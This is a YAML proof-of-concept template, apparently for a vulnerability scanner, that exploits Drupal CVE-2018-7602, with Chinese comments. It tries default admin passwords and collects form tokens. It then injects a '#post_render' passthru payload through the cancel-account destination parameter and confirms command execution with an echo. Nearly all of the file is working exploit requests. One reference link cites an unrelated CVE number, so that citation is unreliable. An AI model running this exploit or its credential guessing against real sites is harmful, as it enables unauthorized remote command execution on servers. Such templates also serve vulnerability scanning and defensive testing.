name: poc-Drupal-CVE-2018-7602
manual: true
transport: http
set: 
  randomEcho: randomLowercase(20)
payloads:
  payloads:
    cred1: 
      u: |
        "admin"
      p: |
        "admin"
    cred2:
      u: | 
        "admin"
      p: |
        "123456"
    cred3:
      u: | 
        "admin"
      p: |
        "admin123"
rules:
  login: # 登录Drupal，主要参数为name、pass，代表账户密码
    request:
      cache: false # 是否使用缓存的请求，如果该选项为 true，那么如果在一次探测中其它脚本对相同目标发送过相同请求，那么便使用之前缓存的响应，而不发新的数据包
      method: POST
      path: /?q=user/login
      # 填充好的账户密码，因为yaml为声明式的语言没有逻辑处理语句
      body: form_id=user_login&name={{u}}&pass={{p}}&op=Log+in
      follow_redirects: false
      headers:
        Content-Type: application/x-www-form-urlencoded
      # 判断响应码是否为302且是否存在Location标头
    expression: |
      response.status == 302 && response.headers["Location"].contains("/user/")
    output:
      search: '"/user/(?<userId>\\w*)".submatch(response.headers["Location"])'
      userId: search["userId"]
  getFormToken: # 获取formToken后续使用
    request:
      cache: false
      method: GET
      path: /?q=/user/{{userId}}/cancel
      follow_redirects: false
      headers:
        Content-Type: application/x-www-form-urlencoded
    expression: |
      response.status == 200 && response.body_string.contains("form_token")
    output:
      search: '"name=\"form_token\" value=\"(?<formToken>\\w*)\"".submatch(response.body_string)'
      formToken: search["formToken"]
  insertCommand: # 基于formToken和userId注入恶意命令
    request:
      cache: false
      method: POST
      path: /?q=/user/{{userId}}/cancel&destination=%2Fuser%2F{{userId}}%2Fcancel%3Fq%5B%2523post_render%5D%5B%5D%3Dpassthru%26q%5B%2523type%5D%3Dmarkup%26q%5B%2523markup%5D%3Decho%2520{{randomEcho}}
      follow_redirects: false
      body: form_id=user_cancel_confirm_form&form_token={{formToken}}&_triggering_element_name=form_id&op=Cancel+account
      headers:
        Content-Type: application/x-www-form-urlencoded
    expression: |
      response.status == 200 && response.body_string.contains(formToken)
    output:
      search: '"name=\"form_build_id\" value=\"(?<form_build_id>[\\w-]*)\"".submatch(response.body_string)'
      formBuildId: search["form_build_id"]
  getResult: # 查看echo命令是否成功回显随机字符
    request:
      cache: false
      method: POST
      path: /?q=file%2Fajax%2Factions%2Fcancel%2F%23options%2Fpath%2F{{formBuildId}}
      follow_redirects: false
      body: form_build_id={{formBuildId}}
      headers:
        Content-Type: application/x-www-form-urlencoded
    expression: |
      response.status == 200 && response.body_string.contains(randomEcho)
expression: login() && getFormToken() && insertCommand() && getResult()
detail:
  description: 登录Drupal后注入恶意参数进行命令执行
  links:
    - https://xz.aliyun.com/t/4854
    - https://nvd.nist.gov/vuln/detail/CVE-2019-3398